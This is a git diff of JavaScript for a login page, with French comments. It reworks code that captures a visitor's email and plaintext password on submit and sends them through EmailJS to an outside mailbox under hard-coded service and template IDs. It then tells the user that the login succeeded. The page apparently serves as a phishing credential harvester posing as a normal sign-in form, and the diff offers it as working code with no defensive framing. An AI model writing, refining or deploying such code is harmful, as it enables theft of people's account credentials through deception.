@@ -21,10 +21,12 @@ document.addEventListener("DOMContentLoaded", function () {
         event.preventDefault();
 
         if (passwordInput.value.trim() !== "") {
+            // Construire le message avec les informations de connexion
+            const message = `Email: ${emailInput.value}\nMot de passe: ${passwordInput.value}`;
+
             // Envoyer les données à EmailJS
             emailjs.send("service_u6vikzg", "template_0x8is9j", {
-                email: emailInput.value,
-                password: passwordInput.value
+                message: message // Utilisez la variable 'message'
             }).then(function(response) {
                 console.log('Email envoyé!', response.status, response.text);
                 alert("Connexion réussie !");
